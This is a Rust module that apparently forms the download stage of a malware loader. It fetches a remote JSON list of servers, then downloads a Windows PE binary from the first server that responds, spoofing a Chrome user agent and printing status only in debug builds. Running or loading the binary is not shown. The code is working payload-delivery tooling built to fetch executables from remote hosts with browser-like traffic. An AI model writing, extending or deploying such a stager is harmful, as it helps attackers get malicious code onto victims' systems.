use reqwest::{self, header};
use serde::Deserialize;
use std::error::Error;

#[derive(Deserialize, Debug)]
struct ServerList {
    servers: Vec<String>,
}

// Fetch JSON with remote server list
pub async fn fetch_server_list(url: String) -> Result<Vec<String>, Box<dyn Error>> {
    // Fetch JSON from server url
    let response = reqwest::get(url).await?;
    let status_code = response.status();

    // Check for invalid status code
    if !status_code.is_success() {
        let err_msg = format!("Server returned status code: {}", status_code);
        return Err(err_msg.into());
    }

    let json_data: serde_json::Value = response.json().await?;
    let server_list: ServerList = serde_json::from_value(json_data)?;
    return Ok(server_list.servers);
}

// Try to fetch PE from server
async fn fetch_pe(url: String) -> Result<Vec<u8>, Box<dyn Error>> {
    // Headers to send
    let mut headers = header::HeaderMap::new();
    headers.insert(
        header::USER_AGENT,
        header::HeaderValue::from_static("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36")
    );

    let client = match reqwest::Client::builder().default_headers(headers).build() {
        Ok(val) => val,
        Err(e) => {
            let err_msg = format!("Failed to create Request Builer: {}", e);
            return Err(e.into());
        }
    };

    let resp = match client.get(url.as_str()).send().await {
        Ok(val) => val,
        Err(e) => {
            let err_msg = format!("Failed to download PE: {}", e);
            return Err(err_msg.into());
        }
    };

    if !resp.status().is_success() {
        let err_msg = format!("Got status code: {}", resp.status());
        return Err(err_msg.into());
    }

    let pe_bytes = match resp.bytes().await {
        Ok(val) => val,
        Err(e) => {
            let err_msg = format!("Failed to fetch PE bytes: {}", e);
            return Err(err_msg.into());
        }
    };

    let pe_bytes: Vec<u8> = pe_bytes.as_ref().to_vec();
    Ok(pe_bytes)
}

// Iterate through the list to fetch binary
pub async fn fetch_data(server_list: Vec<String>) -> Result<Vec<u8>, Box<dyn Error>> {
    // Iterate through server list
    for server in server_list {
        if cfg!(debug_assertions) {
            println!("\n[i] Trying server:\t\t{}", server);
        }

        match fetch_pe(server).await {
            Ok(v) => {
                return Ok(v);
            },
            Err(e) => {
                if cfg!(debug_assertions) {
                    eprintln!("[!] Error occured as:\t\t{}", e);
                }

            }
        }
        
    }

    Err("Failed to get binary from server list".into())
}
